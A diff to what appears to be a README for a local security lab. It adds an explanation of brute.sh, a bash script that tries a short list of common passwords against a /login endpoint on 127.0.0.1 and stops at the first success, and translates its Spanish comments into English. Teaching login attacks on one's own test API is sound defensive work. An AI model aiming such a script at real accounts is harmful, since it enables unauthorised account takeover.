@@ -87,11 +87,33 @@ File: **`brute.sh`** (included). Run in **Git Bash** while the API is running:
 ```bash
 ./brute.sh
 ```
+### Controlled brute-force script (what this does)
+
+The script below performs a **controlled** brute-force test **against your own local API**.  
+It iterates over a small wordlist, sends a POST to `/login` for each guess, and **stops on the first success**.  
+You can safely tweak:
+- `API` → URL of your local server (change port if needed)
+- `USER` → the username to test (e.g., `demo`, `admin`, `leo`)
+- `WORDLIST` → the candidate passwords you want to try
+- `sleep 0.2` → delay between attempts to keep the test controlled
 
 ```bash
+# brute.sh — controlled brute-force demo
+# How it works:
+# 1) Reads candidate passwords from WORDLIST (array below).
+# 2) For each candidate, sends POST /login to your local API.
+# 3) If the response contains "login successful", it prints the finding and exits.
+# Safety:
+# - Small, fixed delay between attempts (sleep 0.2) to avoid overwhelming the API.
+# - Intended ONLY for your local practice API and accounts created for this exercise.
+# You can change:
+# - API:  if your server runs on a different host/port.
+# - USER: which username to test (demo/admin/leo/...).
+# - WORDLIST: add/remove candidate passwords.
+
 #!/usr/bin/env bash
 API="http://127.0.0.1:8000/login"
-USER="leo"   # cambia a 'demo' o 'admin' si quieres
+USER="leo"   # change to 'demo' or 'admin' if you want
 
 WORDLIST=(pass123 123456 admin admin123 demo secret qwerty password adios)
 
@@ -104,7 +126,7 @@ for pwd in "${WORDLIST[@]}"; do
     -H "accept: application/json" \
     -H "Content-Type: application/json" \
     -d "{\"username\":\"$USER\",\"password\":\"$pwd\"}")
-  echo "[$attempts] Probando '$pwd' -> $resp"
+  echo "[$attempts] Trying '$pwd' -> $resp"
   if [[ "$resp" == *"login successful"* ]]; then
     end=$(date +%s)
     echo "FOUND: password='$pwd' in $attempts attempts, $((end-start))s"
@@ -116,7 +138,7 @@ done
 end=$(date +%s)
 echo "NOT found after $attempts attempts in $((end-start))s"
 exit 1
-```
+
 
 > Keep a small delay (e.g., `sleep 0.2`) so the test is **controlled** and you don’t overwhelm the local API.
 
